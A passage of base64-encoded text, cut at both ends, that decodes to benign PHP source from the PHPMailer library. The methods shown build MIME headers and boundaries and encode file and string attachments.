gICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZW5kQm91bmRhcnkoJGJvdW5kYXJ5KQogICAgewogICAgICAgIHJldHVybiBzdGF0aWM6OiRMRSAuICctLScgLiAkYm91bmRhcnkgLiAnLS0nIC4gc3RhdGljOjokTEU7CiAgICB9CiAgICAvKioKICAgICAqIFNldCB0aGUgbWVzc2FnZSB0eXBlLgogICAgICogUEhQTWFpbGVyIG9ubHkgc3VwcG9ydHMgc29tZSBwcmVzZXQgbWVzc2FnZSB0eXBlcywgbm90IGFyYml0cmFyeSBNSU1FIHN0cnVjdHVyZXMuCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRNZXNzYWdlVHlwZSgpCiAgICB7CiAgICAgICAgJHR5cGUgPSBbXTsKICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdhbHQnOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmlubGluZUltYWdlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdpbmxpbmUnOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPmF0dGFjaG1lbnRFeGlzdHMoKSkgewogICAgICAgICAgICAkdHlwZVtdID0gJ2F0dGFjaCc7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSBpbXBsb2RlKCdfJywgJHR5cGUpOwogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIC8vVGhlICdwbGFpbicgbWVzc2FnZV90eXBlIHJlZmVycyB0byB0aGUgbWVzc2FnZSBoYXZpbmcgYSBzaW5nbGUgYm9keSBlbGVtZW50LCBub3QgdGhhdCBpdCBpcyBwbGFpbi10ZXh0CiAgICAgICAgICAgICR0aGlzLT5tZXNzYWdlX3R5cGUgPSAncGxhaW4nOwogICAgICAgIH0KICAgIH0KICAgIC8qKgogICAgICogRm9ybWF0IGEgaGVhZGVyIGxpbmUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAgICAgJG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmd8aW50ICR2YWx1ZQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoZWFkZXJMaW5lKCRuYW1lLCAkdmFsdWUpCiAgICB7CiAgICAgICAgcmV0dXJuICRuYW1lIC4gJzogJyAuICR2YWx1ZSAuIHN0YXRpYzo6JExFOwogICAgfQogICAgLyoqCiAgICAgKiBSZXR1cm4gYSBmb3JtYXR0ZWQgbWFpbCBsaW5lLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHZhbHVlCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHRleHRMaW5lKCR2YWx1ZSkKICAgIHsKICAgICAgICByZXR1cm4gJHZhbHVlIC4gc3RhdGljOjokTEU7CiAgICB9CiAgICAvKioKICAgICAqIEFkZCBhbiBhdHRhY2htZW50IGZyb20gYSBwYXRoIG9uIHRoZSBmaWxlc3lzdGVtLgogICAgICogTmV2ZXIgdXNlIGEgdXNlci1zdXBwbGllZCBwYXRoIHRvIGEgZmlsZSEKICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlIGZpbGUgY291bGQgbm90IGJlIGZvdW5kIG9yIHJlYWQuCiAgICAgKiBFeHBsaWNpdGx5ICpkb2VzIG5vdCogc3VwcG9ydCBwYXNzaW5nIFVSTHM7IFBIUE1haWxlciBpcyBub3QgYW4gSFRUUCBjbGllbnQuCiAgICAgKiBJZiB5b3UgbmVlZCB0byBkbyB0aGF0LCBmZXRjaCB0aGUgcmVzb3VyY2UgeW91cnNlbGYgYW5kIHBhc3MgaXQgaW4gdmlhIGEgbG9jYWwgZmlsZSBvciBzdHJpbmcuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCAgICAgICAgUGF0aCB0byB0aGUgYXR0YWNobWVudAogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSAgICAgICAgT3ZlcnJpZGVzIHRoZSBhdHRhY2htZW50IG5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nICAgIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZEF0dGFjaG1lbnQoJHBhdGgsICRuYW1lID0gJycsICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCwgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmICghc3RhdGljOjppc1Blcm1pdHRlZFBhdGgoJHBhdGgpIHx8ICFAaXNfZmlsZSgkcGF0aCkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfYWNjZXNzJykgLiAkcGF0aCwgc2VsZjo6U1RPUF9DT05USU5VRSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgICAgICBpZiAoJycgPT0gJHR5cGUpIHsKICAgICAgICAgICAgICAgICR0eXBlID0gc3RhdGljOjpmaWxlbmFtZVRvVHlwZSgkcGF0aCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOwogICAgICAgICAgICBpZiAoJycgPT0gJG5hbWUpIHsKICAgICAgICAgICAgICAgICRuYW1lID0gJGZpbGVuYW1lOwogICAgICAgICAgICB9CiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBbCiAgICAgICAgICAgICAgICAwID0+ICRwYXRoLAogICAgICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsCiAgICAgICAgICAgICAgICAyID0+ICRuYW1lLAogICAgICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgICAgICA0ID0+ICR0eXBlLAogICAgICAgICAgICAgICAgNSA9PiBmYWxzZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50CiAgICAgICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgIDcgPT4gJG5hbWUsCiAgICAgICAgICAgIF07CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgICAvKioKICAgICAqIFJldHVybiB0aGUgYXJyYXkgb2YgYXR0YWNobWVudHMuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QXR0YWNobWVudHMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YXR0YWNobWVudDsKICAgIH0KICAgIC8qKgogICAgICogQXR0YWNoIGFsbCBmaWxlLCBzdHJpbmcsIGFuZCBiaW5hcnkgYXR0YWNobWVudHMgdG8gdGhlIG1lc3NhZ2UuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uX3R5cGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvdW5kYXJ5CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGF0dGFjaEFsbCgkZGlzcG9zaXRpb25fdHlwZSwgJGJvdW5kYXJ5KQogICAgewogICAgICAgIC8vIFJldHVybiB0ZXh0IG9mIGJvZHkKICAgICAgICAkbWltZSA9IFtdOwogICAgICAgICRjaWRVbmlxID0gW107CiAgICAgICAgJGluY2wgPSBbXTsKICAgICAgICAvLyBBZGQgYWxsIGF0dGFjaG1lbnRzCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmF0dGFjaG1lbnQgYXMgJGF0dGFjaG1lbnQpIHsKICAgICAgICAgICAgLy8gQ2hlY2sgaWYgaXQgaXMgYSB2YWxpZCBkaXNwb3NpdGlvbl9maWx0ZXIKICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICRkaXNwb3NpdGlvbl90eXBlKSB7CiAgICAgICAgICAgICAgICAvLyBDaGVjayBmb3Igc3RyaW5nIGF0dGFjaG1lbnQKICAgICAgICAgICAgICAgICRzdHJpbmcgPSAnJzsKICAgICAgICAgICAgICAgICRwYXRoID0gJyc7CiAgICAgICAgICAgICAgICAkYlN0cmluZyA9ICRhdHRhY2htZW50WzVdOwogICAgICAgICAgICAgICAgaWYgKCRiU3RyaW5nKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0cmluZyA9ICRhdHRhY2htZW50WzBdOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcGF0aCA9ICRhdHRhY2htZW50WzBdOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGluY2xoYXNoID0gaGFzaCgnc2hhMjU2Jywgc2VyaWFsaXplKCRhdHRhY2htZW50KSk7CiAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoJGluY2xoYXNoLCAkaW5jbCkpIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRpbmNsW10gPSAkaW5jbGhhc2g7CiAgICAgICAgICAgICAgICAkbmFtZSA9ICRhdHRhY2htZW50WzJdOwogICAgICAgICAgICAgICAgJGVuY29kaW5nID0gJGF0dGFjaG1lbnRbM107CiAgICAgICAgICAgICAgICAkdHlwZSA9ICRhdHRhY2htZW50WzRdOwogICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uID0gJGF0dGFjaG1lbnRbNl07CiAgICAgICAgICAgICAgICAkY2lkID0gJGF0dGFjaG1lbnRbN107CiAgICAgICAgICAgICAgICBpZiAoJ2lubGluZScgPT0gJGRpc3Bvc2l0aW9uIGFuZCBhcnJheV9rZXlfZXhpc3RzKCRjaWQsICRjaWRVbmlxKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGNpZFVuaXFbJGNpZF0gPSB0cnVlOwogICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJy0tJXMlcycsICRib3VuZGFyeSwgc3RhdGljOjokTEUpOwogICAgICAgICAgICAgICAgLy9Pbmx5IGluY2x1ZGUgYSBmaWxlbmFtZSBwcm9wZXJ0eSBpZiB3ZSBoYXZlIG9uZQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZTogJXM7IG5hbWU9IiVzIiVzJywKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpLAogICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OiRMRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6JExFCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFJGQzEzNDEgcGFydCA1IHNheXMgN2JpdCBpcyBhc3N1bWVkIGlmIG5vdCBzcGVjaWZpZWQKICAgICAgICAgICAgICAgIGlmIChzdGF0aWM6OkVOQ09ESU5HXzdCSVQgIT0gJGVuY29kaW5nKSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6ICVzJXMnLCAkZW5jb2RpbmcsIHN0YXRpYzo6JExFKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGNpZCkpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1JRDogPCVzPiVzJywgJGNpZCwgc3RhdGljOjokTEUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8gSWYgYSBmaWxlbmFtZSBjb250YWlucyBhbnkgb2YgdGhlc2UgY2hhcnMsIGl0IHNob3VsZCBiZSBxdW90ZWQsCiAgICAgICAgICAgICAgICAvLyBidXQgbm90IG90aGVyd2lzZTogUkZDMjE4MyAmIFJGQzIwNDUgNS4xCiAgICAgICAgICAgICAgICAvLyBGaXhlcyBhIHdhcm5pbmcgaW4gSUVURidzIG1zZ2xpbnQgTUlNRSBjaGVja2VyCiAgICAgICAgICAgICAgICAvLyBBbGxvdyBmb3IgYnlwYXNzaW5nIHRoZSBDb250ZW50LURpc3Bvc2l0aW9uIGhlYWRlciB0b3RhbGx5CiAgICAgICAgICAgICAgICBpZiAoIShlbXB0eSgkZGlzcG9zaXRpb24pKSkgewogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUgPSAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJG5hbWUpKTsKICAgICAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaCgnL1sgXChcKTw+QCw7OlxcIlwvXFtcXVw/PV0vJywgJGVuY29kZWRfbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPSIlcyIlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjokTEUgLiBzdGF0aWM6OiRMRQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGVuY29kZWRfbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9JXMlcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjokTEUgLiBzdGF0aWM6OiRMRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjokTEUgLiBzdGF0aWM6OiRMRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8gRW5jb2RlIGFzIHN0cmluZyBhdHRhY2htZW50CiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZVN0cmluZygkc3RyaW5nLCAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPmVuY29kZUZpbGUoJHBhdGgsICRlbmNvZGluZyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRtaW1lW10gPSBzdGF0aWM6OiRMRTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkbWltZVtdID0gc3ByaW50ZignLS0lcy0tJXMnLCAkYm91bmRhcnksIHN0YXRpYzo6JExFKTsKICAgICAgICByZXR1cm4gaW1wbG9kZSgnJywgJG1pbWUpOwogICAgfQogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBmaWxlIGF0dGFjaG1lbnQgaW4gcmVxdWVzdGVkIGZvcm1hdC4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCAgICAgVGhlIGZ1bGwgcGF0aCB0byB0aGUgZmlsZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgVGhlIGVuY29kaW5nIHRvIHVzZTsgb25lIG9mICdiYXNlNjQnLCAnN2JpdCcsICc4Yml0JywgJ2JpbmFyeScsICdxdW90ZWQtcHJpbnRhYmxlJwogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuY29kZUZpbGUoJHBhdGgsICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIXN0YXRpYzo6aXNQZXJtaXR0ZWRQYXRoKCRwYXRoKSB8fCAhZmlsZV9leGlzdHMoJHBhdGgpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX29wZW4nKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSBmaWxlX2dldF9jb250ZW50cygkcGF0aCk7CiAgICAgICAgICAgIGlmIChmYWxzZSA9PT0gJGZpbGVfYnVmZmVyKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdmaWxlX29wZW4nKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCRmaWxlX2J1ZmZlciwgJGVuY29kaW5nKTsKICAgICAgICAgICAgcmV0dXJuICRmaWxlX2J1ZmZlcjsKICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgIH0KICAgIH0KICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIGluIHJlcXVlc3RlZCBmb3JtYXQuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciAgICAgIFRoZSB0ZXh0IHRvIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgVGhlIGVuY29kaW5nIHRvIHVzZTsgb25lIG9mICdiYXNlNjQnLCAnN2JpdCcsICc4Yml0JywgJ2JpbmFyeScsICdxdW90ZWQtcHJpbnRhYmxlJwogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVTdHJpbmcoJHN0ciwgJGVuY29kaW5nID0gc2VsZjo6RU5DT0RJTkdfQkFTRTY0KQogICAgewogICAgICAgICRlbmNvZGVkID0gJyc7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRlbmNvZGluZykpIHsKICAgICAgICAgICAgY2FzZSBzdGF0aWM6OkVOQ09ESU5HX0JBU0U2NDoKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoCiAgICAgICAgICAgICAgICAgICAgYmFzZTY0X2VuY29kZSgkc3RyKSwKICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OlNURF9MSU5FX0xFTkdUSCwKICAgICAgICAgICAgICAgICAgICBzdGF0aWM6OiRMRQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIHN0YXRpYzo6RU5DT0RJTkdfN0JJVDoKICAgICAgICAgICAgY2FzZSBzdGF0aWM6OkVOQ09ESU5HXzhCSVQ6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCRzdHIpOwogICAgICAgICAgICAgICAgLy8gTWFrZSBzdXJlIGl0IGVuZHMgd2l0aCBhIGxpbmUgYnJlYWsKICAgICAgICAgICAgICAgIGlmIChzdWJzdHIoJGVuY29kZWQsIC0oc3RybGVuKHN0YXRpYzo6JExFKSkpICE9IHN0YXRpYzo6JExFKSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgLj0gc3RhdGljOjokTEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSBzdGF0aWM6OkVOQ09ESU5HX0JJTkFSWToKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHN0cjsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIHN0YXRpYzo6RU5DT0RJTkdfUVVPVEVEX1BSSU5UQUJMRToKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmVuY29kZVFQKCRzdHIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2VuY29kaW5nJykgLiAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZW5jb2RlZDsKICAgIH0KICAgIC8qKgogICAgICogRW5jb2RlIGEgaGVhZGVyIHZhbHVlIChub3QgaW5jbHVkaW5nIGl0cyBsYWJlbCkgb3B0aW1hbGx5LgogICAgICogUGlja3Mgc2hvcnRlc3Qgb2YgUSwgQiwgb3Igbm9uZS4gUmVzdWx0IGluY2x1ZGVzIGZvbGRpbmcgaWYgbmVlZGVkLgogICAgICogU2VlIFJGQzgyMiBkZWZpbml0aW9ucyBmb3IgcGhyYXNlLCBjb21tZW50IGFuZCB0ZXh0IHBvc2l0aW9ucy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgICAgICBUaGUgaGVhZGVyIHZhbHVlIHRvIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkcG9zaXRpb24gV2hhdCBjb250ZXh0IHRoZSBzdHJpbmcgd2lsbCBiZSB1c2VkIGluCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZUhlYWRlcigkc3RyLCAkcG9zaXRpb24gPSAndGV4dCcpCiAgICB7CiAgICAgICAgJG1hdGNoY291bnQgPSAwOwogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7CiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6CiAgICAgICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9bXDIwMC1cMzc3XS8nLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgIC8vIENhbid0IHVzZSBhZGRzbGFzaGVzIGFzIHdlIGRvbid0IGtub3cgdGhlIHZhbHVlIG9mIG1hZ2ljX3F1b3Rlc19zeWJhc2UKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGFkZGNzbGFzaGVzKCRzdHIsICJcMC4uXDM3XDE3N1xcXCIiKTsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRzdHIgPT0gJGVuY29kZWQpIGFuZCAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRlbmNvZGVkOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gIlwiJGVuY29kZWRcIiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCA9IHByZWdfbWF0Y2hfYWxsKCcvW15cMDQwXDA0MVwwNDMtXDEzM1wxMzUtXDE3Nl0vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIC8qIEBub2luc3BlY3Rpb24gUGhwTWlzc2luZ0JyZWFrU3RhdGVtZW50SW5zcGVjdGlvbiAqLwogICAgICAgICAgICBjYXNlICdjb21tZW50JzoKICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ID0gcHJlZ19tYXRjaF9hbGwoJy9bKCkiXS8nLCAkc3RyLCAkbWF0Y2hlcyk7CiAgICAgICAgICAgIC8vZmFsbHRocm91Z2gKICAgICAgICAgICAgY2FzZSAndGV4dCc6CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCArPSBwcmVnX21hdGNoX2FsbCgnL1tcMDAwLVwwMTBcMDEzXDAxNFwwMTYtXDAzN1wxNzctXDM3N10vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIC8vUkZDcyBzcGVjaWZ5IGEgbWF4aW11bSBsaW5lIGxlbmd0aCBvZiA3OCBjaGFycywgaG93ZXZlciBtYWlsKCkgd2lsbCBzb21ldGltZXMKICAgICAgICAvL2NvcnJ1cHQgbWVzc2FnZXMgd2l0aCBoZWFkZXJzIGxvbmdlciB0aGFuIDY1IGNoYXJzLiBTZWUgIzgxOAogICAgICAgICRsZW5ndGhzdWIgPSAnbWFpbCcgPT0gJHRoaXMtPk1haWxlciA/IDEzIDogMDsKICAgICAgICAkbWF4bGVuID0gc3RhdGljOjpTVERfTElORV9MRU5HVEggLSAkbGVuZ3Roc3ViOwogICAgICAgIC8vIFRyeSB0byBzZWxlY3QgdGhlIGVuY29kaW5nIHdoaWNoIHNob3VsZCBwcm9kdWNlIHRoZSBzaG9ydGVzdCBvdXRwdXQKICAgICAgICBpZiAoJG1hdGNoY291bnQgPiBzdHJsZW4oJHN0cikgLyAzKSB7CiAgICAgICAgICAgIC8vIE1vcmUgdGhhbiBhIHRoaXJkIG9mIHRoZSBjb250ZW50IHdpbGwgbmVlZCBlbmNvZGluZywgc28gQiBlbmNvZGluZyB3aWxsIGJlIG1vc3QgZWZmaWNpZW50CiAgICAgICAgICAgICRlbmNvZGluZyA9ICdCJzsKICAgICAgICAgICAgLy9UaGlzIGNhbGN1bGF0aW9